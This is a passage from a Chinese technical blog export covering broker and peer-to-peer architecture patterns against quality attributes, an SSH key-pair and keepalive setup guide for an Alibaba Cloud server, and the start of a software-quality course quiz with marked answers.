<p>**举例：**在一个电子商务网站中，订单管理系统和商品管理系统之间需要进行信息的交互。如果采用代理者模式，将交互过程交给broker，当其中一个系统出现故障时，不会影响到另一个系统的正常运行，不过broker如果故障，则都会受到影响。</p>
<p>**候选策略：**实现多个服务节点的负载均衡和自动故障转移，使用可靠的消息传递机制，对异常情况进行监控和处理，确保服务的可用性。采用备用broker，当原来的broker故障时自动投入。</p>
 <span id="more"></span>

<p><strong>2.</strong>  <strong>Interoperability</strong> <strong>互操作性</strong></p>
<p>代理者模式将对象之间的交互转移给了broker，从而实现了对象间的解耦，使得系统更具互操作性。具体的，代理模式可以用于隐藏服务的具体实现细节，从而使得客户端可以更加方便地使用服务。Broker也可以充当翻译器的角色，将来自不同系统的数据进行格式转换，从而使得不同系统之间更容易地进行通信和互操作。</p>
<p>**举例：**在一个多人在线游戏中，玩家之间需要进行实时的数据交互。采用代理者模式，将数据交互过程交给代理者对象，从而实现了玩家之间的解耦，使得游戏具互操作性。</p>
<p><strong>3.</strong>  <strong>Modifiability</strong> <strong>可修改性</strong></p>
<p>代理者模式将对象之间的交互转移给了broker，减少了对象之间的直接依赖，从而使得系统更具可修改性。当某个对象需要修改时，只需要修改与代理者之间的交互过程，而不需要修改其他对象的代码，从而提高了系统的可修改性。</p>
<p>**举例：**在一个银行系统中，用户需要通过账户系统进行操作，但是账户系统中的代码需要进行修改。采用中介者模式，将交互过程交给中介者对象，当需要修改代码时，只需要修改中介者对象的代码即可，而不需要修改其他对象的代码，从而提高了系统的可修改性。</p>
<p><strong>4.</strong>  <strong>Performance</strong> <strong>性能</strong></p>
<p>通过broker进行交互的过程需要额外的开销，降低了系统的性能。此外broker可能会成为整个系统的性能瓶颈。</p>
<p>**举例：**在一个多人在线游戏中，采用中介者模式实现玩家之间的数据交互，玩家之间原本之间交互数据，改为了通过代理者进行交互，需要额外的步骤和开销。</p>
<p>**候选策略：**使用延迟加载的技术，即在需要使用代理对象时才加载，减少了系统中不必要的代理对象，提高系统的性能。</p>
<p><strong>5.</strong>  <strong>Security</strong> <strong>安全性</strong></p>
<p>因为需要处理和传输敏感数据，Broker可能成为安全攻击的目标。此外如果没有适当的安全措施，客户端和服务端可能会容易受到中间人攻击。</p>
<p>**举例：**在使用消息代理时，如果 Broker 没有进行适当的安全措施，例如身份验证、加密等，那么黑客可以使用中间人攻击来窃取或篡改消息。</p>
<p>**候选策略：**使用安全协议和加密技术来保证消息的机密性和完整性。也可以限制 Broker 的访问权限，只允许授权用户和服务端访问。</p>
<p><strong>6.</strong>  <strong>Testability</strong> <strong>可测试性</strong></p>
<p>由于 Broker 作为中间件存在，需要进行额外的配置和设置，可能会使测试变得更加困难。</p>
<p>**举例：**在测试使用消息代理的应用程序时，需要配置 Broker，并确保 Broker 正常运行。如果 Broker 发生故障，或者配置不正确，可能会导致测试失败。</p>
<p>**候选策略：**使用自动化测试框架和工具，对 Broker 进行自动化测试和监控。</p>
<p><strong>7.</strong>  <strong>Usability</strong> <strong>可用性</strong></p>
<p>代理模式通过提供一个统一的接口来隐藏底层服务的复杂性，这样客户端就可以更方便地使用系统。</p>
<p>**举例：**一个采用Broker Pattern的分布式系统，可以提供一个中央的服务目录，使得客户端可以轻松地发现和使用各种服务，而不需要了解底层的服务实现细节。</p>
<p><strong>8.</strong>  <strong>Extensibility</strong> <strong>可扩展性</strong></p>
<p>代理模式可以通过添加新的客户端或服务端代理来扩展系统，而不需要对现有的服务提供商进行修改，这使得系统更容易扩展。</p>
<p><strong>9.</strong>  <strong>Maintainability</strong> <strong>可维护性</strong></p>
<p>代理模式将客户端和服务端解耦，使得系统更容易维护和修改。如果服务端发生更改，只需修改服务端代理，而无需更改客户端代理，反之同理。</p>
<p><strong>10.</strong> <strong>Reliability</strong> <strong>可靠性</strong></p>
<p>代理模式增加了中间层，这可能导致系统出现单点故障，并影响系统的可靠性。</p>
<p>**举例：**如果broker发生故障，则所有客户端和服务器都无法进行通信，这可能导致整个系统不可用。</p>
<p>**候选策略：**使用备用broker来提高可靠性，并采用负载均衡和故障转移等技术。</p>
<p><strong>11.</strong> <strong>Recoverability</strong> <strong>可恢复性</strong></p>
<p>代理模式对可恢复性没有显著影响，但在出现故障考虑恢复策略时，可以使用备用broker来增强可恢复性。</p>
<h4 id="二-Peer-to-Peer-Patterns（点对点模式）"><a href="#二-Peer-to-Peer-Patterns（点对点模式）" class="headerlink" title="二 Peer-to-Peer Patterns（点对点模式）"></a><strong>二 Peer-to-Peer Patterns（点对点模式）</strong></h4><p><strong>1.</strong>  <strong>Availability</strong> <strong>可用性</strong></p>
<p>点对点模式通过将请求和服务分布到不同的节点上，如果一个节点发生故障，其他节点仍然可以继续提供服务，从而避免了整个系统的故障，提高了系统的可用性。此外，点对点模式中的节点之间可以建立冗余连接，进一步提高了系统的可用性。</p>
<p>**举例：**在一个分布式文件系统中，采用点对点模式实现节点之间的文件共享和存储。当某个节点不可用时，其他节点可以继续提供服务。</p>
<p><strong>2.</strong>  <strong>Interoperability</strong> <strong>互操作性</strong></p>
<p>点对点模式不依赖于中心化的服务或中间人，每个节点都是独立的，并且可以相互通信和交换信息。这使得点对点模式更容易支持不同平台和编程语言之间的互操作性。通过共享协议和标准化的消息格式，不同节点之间可以无缝地交互和通信。这种去中心化的结构可以更容易地扩展到更大规模的网络，并支持更高的灵活性。</p>
<p>**举例：**BitTorrent协议就是一个点对点模式的应用，它可以在不同的操作系统和平台上运行，并且允许用户在不同的设备上共享和下载文件，这种去中心化的结构使得BitTorrent可以支持不同平台和编程语言之间的互操作性。</p>
<p><strong>3.</strong>  <strong>Modifiability</strong> <strong>可修改性</strong></p>
<p>由于通信方式是点对点的，每个节点都需要知道自己连接的所有节点，因此增加或删除节点可能会涉及到多个节点的修改，从而增加了系统修改的难度和成本。</p>
<p>**举例：**在一个点对点的文件共享系统中，如果需要增加一个新的文件夹，需要在每个节点上修改相应的代码以支持该文件夹的共享。</p>
<p>**候选策略：**在设计时采用松耦合的设计原则，使得系统中的每个节点都可以单独修改和升级，而不会影响到其他节点。</p>
<p><strong>4.</strong>  <strong>Performance</strong> <strong>性能</strong></p>
<p>点对点模式中每个节点直接连接到其他节点，消息传递的路径更短，通信的延迟更低。此外，每个节点可以独立地处理请求，从而提高了系统的并发性和吞吐量。</p>
<p>**举例：**在一个点对点的视频会议系统中，每个节点可以直接连接到其他节点，从而实现视频流的实时传输，减少了中间节点的传输延迟和网络拥塞的影响，提高了系统的性能。</p>
<p>**候选策略：**系统设计时，需要考虑节点的数量和节点之间的连接方式，以尽可能减少节点之间的通信延迟和数据传输量，提高系统的性能。此外，可以考虑采用分布式缓存等技术来优化系统的性能。</p>
<p><strong>5.</strong>  <strong>Security</strong> <strong>安全性</strong></p>
<p>点对点模式可能增加了系统的安全风险，因为数据和服务不再集中在中央服务器上，而是分布在各个节点上。如果一个节点被攻击，攻击者可能会访问该节点的敏感信息，并对整个系统造成影响。</p>
<p>**举例：**在点对点的文件共享网络中，恶意用户可能会通过共享感染了病毒或恶意软件的文件来攻击其他用户。</p>
<p>**候选策略：**使用安全协议和加密技术来确保节点之间的通信和数据传输的安全性。同时，还可以使用身份验证和访问控制来限制对敏感信息和服务的访问。</p>
<p><strong>6.</strong>  <strong>Testability</strong> <strong>可测试性</strong></p>
<p>点对点模式可能会使系统的测试更加困难，因为需要考虑到各个节点的不同情况和不同环境。此外，由于系统的复杂性和分散性，需要建立更复杂的测试基础设施。同时也需要考虑到网络和通信方面的问题，例如网络延迟和数据传输错误。</p>
<p>**举例：**在一个点对点的视频会议系统中，需要考虑到各个参与者的不同设备和网络环境，这增加了系统测试的复杂性。</p>
<p>**候选策略：**建立有效的测试基础设施，包括模拟各种节点环境的测试工具和自动化测试工具。</p>
<p><strong>7.</strong>  <strong>Usability</strong> <strong>可用性</strong></p>
<p>点对点模式可能会使系统的易用性降低，因为需要用户自行管理节点和服务，并处理各种不同的环境和情况。</p>
<p>**举例：**在一个点对点的文件共享网络中，用户需要自行管理节点和文件，而且需要考虑到各个节点之间的不同环境和可用性。</p>
<p>**候选策略：**提供易于使用的界面和工具来管理节点和服务，并确保系统的一致性和可预测性。同时，还可以提供帮助文档和培训材料来帮助用户更好地使用系统。</p>
<p><strong>8.</strong>  <strong>Extensibility</strong> <strong>可扩展性</strong></p>
<p>由于每个节点都是独立的，因此向系统中添加新节点比较容易。但是，当节点数量增加时，系统的复杂性也会增加，此时就需要特别小心地设计和管理系统以保持其可扩展性。</p>
<p>**举例：**在一个点对点文件共享系统中，当用户需要向系统中添加新的文件共享节点时，可以通过添加新节点来轻松扩展系统。但是，如果系统中节点数量增加到数百个或数千个，则可能需要变得困难。</p>
<p>**候选策略：**采用模块化的设计和实现方式，将系统划分为不同的模块，每个模块只需要与其它必要的模块进行通信。这样可以将系统中的复杂性分散到不同的模块中，使得系统更易于扩展和维护。同时，采用适当的设计模式和架构可以进一步提高系统的可扩展性。</p>
<p><strong>9.</strong>  <strong>Maintainability</strong> <strong>可维护性</strong></p>
<p>点对点模式使系统的维护变得更加困难，因为系统中的每个节点都是独立的，并且没有一个中心化的控制点。如果需要修改系统的某个部分，必须考虑到系统中所有节点的影响。这可能导致修改过程变得繁琐和耗时。</p>
<p>**举例：**在一个点对点的文件共享网络中，如果需要修改系统的搜索功能，必须考虑到所有节点的影响。这可能需要修改每个节点的代码，这将是一个繁琐和耗时的过程。</p>
<p><strong>10.</strong> <strong>Reliability</strong> <strong>可靠性</strong></p>
<p>在点对点通信的过程中，每个节点都可能会由于网络问题、硬件故障等原因而出现异常，从而导致服务的不可用或延迟。此外，点对点模式还可能会增加系统中的冗余，从而降低系统的可靠性。</p>
<p>**举例：**在一个点对点的分布式文件共享系统中，每个节点都可以充当文件的提供者和请求者，但是由于节点的数量众多，节点之间的连接和文件传输可能会受到网络状况的影响，从而影响系统的可靠性。</p>
<p>**候选策略：**可以采用冗余备份的方式来提高系统的可靠性，例如将每个节点的数据备份到多个节点中，以避免单点故障的影响。此外，也可以通过对数据进行校验和、故障检测和恢复等手段来提高系统的可靠性。</p>
<p><strong>11.</strong> <strong>Recoverability</strong> <strong>可恢复性</strong></p>
<p>由于节点之间的连接可能会受到各种因素的影响，因此在节点故障或数据损坏的情况下，系统的恢复可能会更加困难。此外，点对点模式还可能会增加数据的分布程度，使得数据的备份和恢复更加复杂。</p>
<p>**举例：**在一个点对点的分布式数据库系统中，每个节点都可以存储部分数据，但是由于节点数量众多，数据的备份和恢复可能会变得困难。</p>
<p>**候选策略：**可以采用分布式数据备份和恢复的方式来提高系统的可恢复性，例如使用多个节点进行数据备份，并定期进行数据同步和检查。此外，也可以使用数据冗余和容错机制来提高系统的可恢复性。</p>
<h3 id="Task-2-Architecture-Patterns-vs-Quality-Attributes-Tactics"><a href="#Task-2-Architecture-Patterns-vs-Quality-Attributes-Tactics" class="headerlink" title="Task 2: Architecture Patterns vs. Quality Attributes &amp; Tactics"></a><strong>Task 2: Architecture Patterns vs. Quality Attributes &amp; Tactics</strong></h3><ol>
<li><p><strong>Availability 可用性</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211224142.png" alt="image-20241215211224142"></p>
</li>
</ol>
<p>**管道过滤器模式：**通过在相应的管道或者过滤器设置错误探测器来尽快发现可能的错误，从而提高系统的可用性。此外，在找到的出错点尽可能靠近的位置重启，并在管道和过滤器进行预测可以提高系统的恢复能力。</p>
<p>**点对点模式：**通过将相应的请求分配给对应的服务，更迅速地发现错误和故障，从而提高系统的可用性。</p>
<p>**层级模式：**通过将系统的不同功能模块分层，实现内聚性更高、耦合性更低，从而使得系统更容易进行管理和维护。此外，错误探查阶段成本低易于进行管理，并且系统的生命周期成本也低，可以快速部署，从而增强了系统的可用性。</p>
<p>**微服务模式：**通过将系统拆分成多个服务，分别重启服务、更新等，从而减少单点失效的风险，提高系统的可用性。同时，也可以利用相应的策略如异常检测、软件升级等来增强系统的可用性。</p>
<ol start="2">
<li><strong>Interoperability 互操作性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211238277.png" alt="image-20241215211238277"></p>
<p>**管道过滤器模式：**管道模式本身并不直接有利于服务发现，但是可以通过在管道中引入服务发现的机制，从而实现服务发现。</p>
<p>**点对点模式：**可以根据不同的组件之间的通信需求，定制特定的接口。</p>
<p>**层级模式：**层级模式可以将系统的不同层次分离开来，从而降低了系统组件之间的耦合性，这有助于提高系统的互操作性。在编排时，也可以利用层级模式中的控制器进行各个组件之间的协调。</p>
<p>**微服务模式：**通过将系统中的不同功能拆分成多个独立的服务，每个服务都有独立的接口和协议，这有助于服务的编排和定制接口。此外，可以利用微服务模式中的服务注册表进行服务的发现和注册。</p>
<ol start="3">
<li><strong>Modifiability 可修改性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211307020.png" alt="image-20241215211307020"></p>
<p>**管道过滤器模式：**通过使用管道和过滤器组成的链式结构来处理数据，每个过滤器都可以独立修改和扩展，因此该模式有利于拆分模块和提高语义内聚性。然而，由于每个过滤器都是独立的，因此限制依赖关系和重构可能会更加困难。</p>
<p>**点对点模式：**通过使用直接通信连接两个或多个节点，因此每个节点都可以独立修改和扩展。这种独立性有利于拆分模块和提高语义内聚性。然而，由于每个节点都是独立的，限制依赖关系和重构可能会更加困难。</p>
<p>**层级模式：**通过使用分层架构来组织系统，并使用接口和抽象层来实现模块化和解耦。每个层次都可以独立修改和扩展，并且层次之间的依赖关系是明确定义的。这种层次结构有利于限制依赖关系和重构，但可能会增加系统的复杂性。</p>
<p>**微服务模式：**通过使用独立部署的服务来实现系统功能，并使用接口和抽象层来实现模块化和解耦。每个服务都可以独立修改和扩展，并且服务之间的依赖关系是明确定义的。这种服务结构有利于限制依赖关系和重构，但可能会增加系统的复杂性和部署成本。</p>
<ol start="4">
<li><strong>Performance 性能</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211327819.png" alt="image-20241215211327819"></p>
<p>**管道过滤器模式：**由于管道模式是一种串行的处理方式，因此可能会导致性能瓶颈。在采用管道模式时，需要考虑管理采样率、降低开销等策略来提高性能。</p>
<p>**点对点模式：**点对点模式通常是一种异步的处理方式，可以通过并发处理来提高性能。在采用点对点模式时，需要考虑管理采样率、优先处理事件等策略来提高性能。</p>
<p>**层级模式：**层级模式可以通过缓存来提高性能，但同时也可能会增加延迟。在采用层级模式时，需要考虑管理采样率、限制事件响应等策略来提高性能。</p>
<p>**微服务模式：**由于微服务架构通常会将应用程序拆分为多个服务，因此可以通过横向扩展来提高性能。在采用微服务模式时，可以考虑增加资源、引入并发等策略来提高性能。</p>
<ol start="5">
<li><strong>Security 安全性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211342238.png" alt="image-20241215211342238"></p>
<p>**管道过滤器模式：**可以通过在管道中添加不同的安全过滤器来实现消息的验证和加密等安全功能。 </p>
<p>**点对点模式：**点对点模式的安全性高度依赖于每个节点的安全措施，因此需要在每个节点上实施安全措施来确保整个系统的安全性，但是由于需要考虑到其对其他节点的影响，一些撤销和恢复操作在点对点模式下比较困难。</p>
<p>**层级模式：**可以在各个层次之间设置安全措施来保护系统的安全性，每个层次可以独立地处理和管理其自身的安全功能和安全策略，例如限制访问权限，检测和过滤恶意数据等。</p>
<p>**微服务模式：**微服务模式可以通过微服务间的隔离和认证等措施来增强系统的安全性。</p>
<ol start="6">
<li><strong>Testability 可测试性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211402067.png" alt="image-20241215211402067"></p>
<p>**管道过滤器模式：**管道模式使用链式结构将数据处理分为多个独立的过滤器，每个过滤器都可以独立测试和调试。此外，每个过滤器之间的输入和输出都是清晰明确的，这使得测试和调试变得更加容易。</p>
<p>**点对点模式：**点对点模式的可测试性与实现方式有关。如果每个节点都是相同的，那么它们可以被看作是独立的模块，并可以分别测试和调试。但是，如果节点之间有很多差异（例如不同的协议或不同的操作系统），则测试和调试可能会更加困难。</p>
<p>**层级模式：**通过使用分层架构和接口来实现模块化和解耦，可以使测试和调试变得更加容易。每个层次都可以独立测试和调试，且层次之间的依赖关系是明确定义的，这有助于限制依赖关系和重构，使得测试和调试更加容易。</p>
<p>**微服务模式：**微服务模式具有较高的可测试性，因为它使用独立部署的服务来实现系统功能，并使用接口和抽象层来实现模块化和解耦。每个服务都可以独立测试和调试，且服务之间的依赖关系是明确定义的，类似的这有助于限制依赖关系和重构，使得测试和调试更加容易。</p>
<ol start="7">
<li><strong>Usability 可用性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211418026.png" alt="image-20241215211418026"></p>
<p>**管道过滤器模式：**由于管道模式的组件是单向的，因此不太支持可撤销、暂停&#x2F;恢复等功能，也难以维护任务或用户模型等，这些功能可能需要组合多个过滤器才能实现。</p>
<p>**点对点模式：**该模式强调直接的点对点通信，可以提高系统的响应性和用户体验。然而，该模式的可用性高度依赖于节点之间的可靠通信，节点之间可能会存在不同的数据格式和协议，这可能会增加实现和集成的难度。</p>
<p>**层次模式：**通过明确的分层结构来组织系统，可以在每个层次内独立地进行撤销、暂停&#x2F;恢复等功能，也更容易维护各种模型。</p>
<p>**微服务模式：**类似的，由于每个服务都是独立的，在每个服务内可以轻松地进行撤销、暂停&#x2F;恢复等功能，也更容易维护各种模型。</p>
<ol start="8">
<li><strong>Extensibility 可扩展性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211455582.png" alt="image-20241215211455582"></p>
<p>**管道过滤器模式：**该模式将系统分解为相对独立的模块，并且明确定义它们之间的接口，从而可以更容易地实现模块化和限制模块之间的依赖关系。此外，该模式通过一个明确定义的管道流程来处理数据，使得可以更容易地添加或删除模块，提高了系统的可扩展性。</p>
<p>**点对点模式：**将系统分解为互相独立的节点，每个节点都可以具有自己的数据和逻辑处理能力。这种模式下的节点之间可以通过消息传递来交互，并且可以动态地添加或删除节点，从而实现系统的可扩展性。但由于节点之间的差异，这使得一些统一的工具和流程变得难以使用。</p>
<p>**层次模式：**通过将系统分解为多个层次，每个层次都可以相对独立地进行扩展和维护。</p>
<p>**微服务模式：**将系统分解为多个小型服务，每个服务都可以独立进行扩展和维护。此外，微服务模式可以实现松散耦合，从而可以动态地添加或删除服务，并且不会对整个系统产生太大的影响。</p>
<ol start="9">
<li><strong>Maintainability 可维护性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211518324.png" alt="image-20241215211518324"></p>
<p>**管道过滤器模式：**模块化和接口定义有利于维护性，但如果模块之间依赖过于紧密，可能会增加维护难度。</p>
<p>**点对点模式：**模块化和接口定义同样有利于维护性，但如果系统规模较大，点对点的复杂度可能会使系统变得难以维护。</p>
<p>**层级模式：**模块化和分层有利于维护性，但如果层级嵌套过深，维护难度也会增加。</p>
<p>**微服务模式：**微服务的拆分和独立部署有利于维护性，但由于微服务数量较多，可能增加系统的复杂性和管理难度。</p>
<ol start="10">
<li><strong>Reliability 可靠性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211534197.png" alt="image-20241215211534197"></p>
<p>**管道过滤器模式：**通常会采用多个小型组件构建一个大型系统，每个组件都有清晰的输入和输出，通过组合这些组件可以实现各种复杂的功能。这种模式可以提高可靠性，因为每个组件都相对简单，容易测试和调试，同时也方便进行故障隔离和排除。</p>
<p>**点对点模式：**可能更加容易受到单个节点故障的影响，因为节点之间的依赖关系比较紧密。但是通过采用冗余设备和故障切换等技术，可以提高可靠性。</p>
<p>**层级模式：**将系统分成多个层次，每个层次都负责不同的功能。每个层次都相对独立，容易测试和调试，同时也方便进行故障隔离和排除。</p>
<p>**微服务模式：**每个服务都是相对独立的，可以独立部署和升级。每个服务都相对简单，同样的，容易测试和调试，同时也方便进行故障隔离和排除。</p>
<ol start="11">
<li><strong>Recoverability 可恢复性</strong></li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215211558820.png" alt="image-20241215211558820"></p>
<p>**管道过滤器模式：**由于每个组件都是相互独立的，因此出现故障时可以更容易地定位和恢复。同时，由于该模式中的组件是按照一定顺序组成的管道，因此可以通过在管道中添加重试机制或备用组件来增加系统的可恢复性。</p>
<p>**点对点模式：**由于每个节点都是相互独立的，因此出现故障时可以更容易地定位和恢复。但是，由于该模式中的节点之间是直接相连的，因此在节点之间进行故障切换或重试可能会更加困难。</p>
<p>**层级模式：**由于每个层次都是相互独立的，因此出现故障时可以更容易地定位和恢复。同时，由于该模式中的每个层次都提供了一定程度的抽象和隔离，因此可以通过在每个层次中添加重试机制或备用组件来增加系统的可恢复性。</p>
<p>**微服务模式：**由于每个服务都是相互独立的，因此出现故障时可以更容易地定位和恢复。同时，由于该模式中的服务之间是通过网络连接的，因此可以通过在服务之间添加负载均衡、重试机制或备用服务来增加系统的可恢复性。但是，由于微服务架构中的服务数量通常非常庞大，因此进行故障检测和恢复可能会更加复杂。</p>
]]></content>
      <categories>
        <category>软件系统设计</category>
      </categories>
      <tags>
        <tag>软件系统设计</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云ECS服务器ssh配置</title>
    <url>/2024/12/16/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8ssh%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>今天使用了购买的阿里云ECS服务器，并配置了一些SSH，提升了操作的便捷性和安全性。</p>
<p>以下的配置过程都是基于阿里云ECS服务器（Ubuntu 24.04）的，其他服务器或系统操作过程类似。</p>
<h3 id="SSH配置密钥对"><a href="#SSH配置密钥对" class="headerlink" title="SSH配置密钥对"></a>SSH配置密钥对</h3><blockquote>
<p>使用 SSH 密钥对而不是密码登录，能显著提升系统的安全性，防止暴力破解、密码泄露以及中间人攻击等风险。同时，密钥对还便于自动化管理、批量配置和精细化权限控制。因此，SSH 密钥对已成为现代网络和服务器管理中的最佳实践。</p>
<p>此外，使用SSH密钥对可以在每次ssh远程连接时，省去输入密码的过程。</p>
</blockquote>
<span id="more"></span>

<h4 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h4><p><strong>(如果你的电脑上已有了密钥对（查看是否存在~&#x2F;.ssh&#x2F;目录），跳过该步骤)</strong></p>
<p>在命令行中输入：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen</span></span><br></pre></td></tr></table></figure>

<p>会出现交互提示，如下：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter <span class="keyword">file</span> in which <span class="keyword">to</span> save the key (~/.ssh/id_rsa): &lt;== 密钥对存放位置，用默认地址，按 Enter </span><br><span class="line">Created directory <span class="string">&#x27;/root/.ssh&#x27;</span>.</span><br><span class="line">Enter passphrase (<span class="built_in">empty</span> <span class="keyword">for</span> <span class="keyword">no</span> passphrase): &lt;== 输入密钥锁码（可选），或直接按 Enter 留空（建议）</span><br><span class="line">Enter same passphrase again: &lt;== 再输入一遍密钥锁码</span><br><span class="line">Your identification <span class="built_in">has</span> been saved in ~/.ssh/id_rsa. &lt;== 生成的私钥地址</span><br><span class="line">Your public key <span class="built_in">has</span> been saved in ~/.ssh/id_rsa.pub. &lt;== 生成的公钥地址</span><br><span class="line">The key fingerprint <span class="keyword">is</span>:</span><br><span class="line"><span class="number">0</span><span class="keyword">f</span>:d3:e7:<span class="number">1</span><span class="variable">a:1c</span>:<span class="keyword">bd</span>:<span class="number">5</span><span class="keyword">c</span>:<span class="number">03</span>:f1:<span class="number">19</span>:f1:<span class="number">22</span>:df:<span class="number">9</span><span class="variable">b:cc</span>:<span class="number">08</span> root@host</span><br></pre></td></tr></table></figure>

<h4 id="设置公钥（阿里云）"><a href="#设置公钥（阿里云）" class="headerlink" title="设置公钥（阿里云）"></a>设置公钥（阿里云）</h4><p>进入云服务器ECS控制台，左侧栏选择“网络与安全&#x2F;密钥对”。然后创建密钥对，按下图填写，其中公钥内容在~&#x2F;.ssh&#x2F;id_rsa.pub里可以找到。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241216234034450.png" alt="image-20241216234034450" style="zoom:50%;" />

<p>到这里就算完成了，在你的本机输入以下命令看是否能用ssh无密码登陆。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">root@<span class="keyword">&lt;你的服务器公网ip&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="SSH公钥原理"><a href="#SSH公钥原理" class="headerlink" title="SSH公钥原理"></a>SSH公钥原理</h4><p>SSH公钥登陆的原理图如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241216234640002.png" alt="image-20241216234640002" style="zoom:67%;" />

<h3 id="解决SSH远程连接闲置时间过长而断线"><a href="#解决SSH远程连接闲置时间过长而断线" class="headerlink" title="解决SSH远程连接闲置时间过长而断线"></a>解决SSH远程连接闲置时间过长而断线</h3><p>进入服务器命令行，打开sshd配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p>然后定位到下面两行：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#ClientAliveInterval 0</span></span><br><span class="line"><span class="meta">#ClientAliveCountMax 3</span></span><br></pre></td></tr></table></figure>

<p>去掉注释，修改为下面这样：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">ClientAliveInterval <span class="number">30</span>  <span class="comment">// 客户端每隔多少秒向服务发送一个心跳数据</span></span><br><span class="line">ClientAliveCountMax <span class="number">86400</span>  <span class="comment">// 客户端多少秒没有请求交互，服务器自动断掉连接</span></span><br></pre></td></tr></table></figure>

<p>然后重启服务（Ubuntu 24.04）</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service ssh restart</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云服务器</category>
      </categories>
      <tags>
        <tag>阿里云</tag>
        <tag>ECS</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>软件质量与管理2023 课上选择题</title>
    <url>/2024/12/15/%E8%BD%AF%E4%BB%B6%E8%B4%A8%E9%87%8F%E4%B8%8E%E7%AE%A1%E7%90%86-%E8%AF%BE%E4%B8%8A%E9%80%89%E6%8B%A9%E9%A2%98/</url>
    <content><![CDATA[<ol>
<li><p>“Measure twice, cut once” 描述的是下述哪个软件开发场景： </p>
<p>A. 软件设计； </p>
<p>&#x3D;&#x3D;<strong>B. 代码评审；</strong>&#x3D;&#x3D;</p>
<p>C. 需求开发； </p>
<p>D. V&amp;V；</p>
</li>
<li><p>整体来看，我们可以把软件的发展分为三大阶段，以下不属于三大主要阶段的是：</p>
<p>A. 软硬件一体化； (1950s - 1970s)</p>
<p>B. 网络化和服务化； (1970s - 1990s)</p>
<p><strong>&#x3D;&#x3D;C. 云计算化和云原生；&#x3D;&#x3D;</strong> </p>
<p>D.软件成为独立产品；(1990s - )</p>
<span id="more"></span>
</li>
<li><p>以下描述中，不属于软件开发本质困难或者本质挑战的是： </p>
<p><strong>&#x3D;&#x3D;A. 质量难题；&#x3D;&#x3D;</strong> </p>
<p>B. 复杂性； </p>
<p>C. 不可见； </p>
<p>D. 一致性；</p>
</li>
<li><p>以下描述中，哪一种实践是软硬件一体化阶段的典型实践：</p>
<p><strong>&#x3D;&#x3D;A. Code and Fix；&#x3D;&#x3D;</strong> </p>
<p>B. 迭代式开发； </p>
<p>C. 瀑布生命周期模型； </p>
<p>D. 成熟度模型；</p>
</li>
<li><p>对比TSP和SCRUM，下列说法<strong>不恰当</strong>的是： </p>
<p>A. 都是过程框架，需要填补具体实践之后才是一个可以工作的过程； </p>
<p>B. 一种是计划驱动方法，另外一种是敏捷方法； </p>
<p><strong>&#x3D;&#x3D;C. SCRUM适合迭代式场景，TSP适合瀑布场景；&#x3D;&#x3D;</strong> （两者都适合）</p>
<p>D. 两种方法都需要进行度量数据收集、分析，从而支持管理决策；</p>
</li>
<li><p>以下特征适用麦克勒格Y理论（McGregors Theory Y）激励的场合是： </p>
<p>A. 关注工作环境，薪金等； </p>
<p>B. 更喜欢经常的指导，避免承担责任，缺乏主动性 </p>
<p>C. 自我中心，对组织需求反应淡漠，反对变革 </p>
<p><strong>&#x3D;&#x3D;D. 能够自我约束，自我导向与控制，渴望承担责任&#x3D;&#x3D;</strong></p>
</li>
<li><p>以下关于马斯洛的需求层次理论描述<strong>不正确</strong>的是： </p>
<p>A. 自我实现是寻求自尊（Esteem） </p>
<p>B. 激励来自为没有满足的需求而努力奋斗 </p>
<p>C. 低层次的需求必须在高层次需求满足之前得到满足 </p>
<p><strong>&#x3D;&#x3D;D. 满足高层次的需求的途径比满足低层次的途径更少&#x3D;&#x3D;</strong></p>
</li>
<li><p>以下关于团队动力学的论述，<strong>不恰当</strong>的是： </p>
<p><strong>&#x3D;&#x3D;A. 马斯洛的需求层次理论可以用来更好地维持激励水平；&#x3D;&#x3D;</strong> </p>
